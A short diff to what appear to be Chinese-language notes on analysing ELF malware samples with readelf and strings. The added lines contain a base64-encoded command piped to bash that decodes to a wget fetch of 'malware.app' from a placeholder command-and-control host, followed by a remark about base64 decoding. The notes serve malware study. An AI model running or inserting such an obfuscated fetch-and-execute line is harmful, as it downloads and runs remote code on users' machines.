@@ -21,3 +21,5 @@ Strip实用程序也可以在ELF报头中留下section和patch字段(e shoff: se
 ## ELF头--入口点，程序头表的位置
 ## readelf -h training-sample-- view header info
 ## strings training-sample > str.txt
+## echo d2dldCBodHRwOi8vc29tZW5vbmV4aXRpbmdjbmNbLl1jb20vbWFsd2FyZS5hcHA=|base64 -d |bash;
+## base64解密
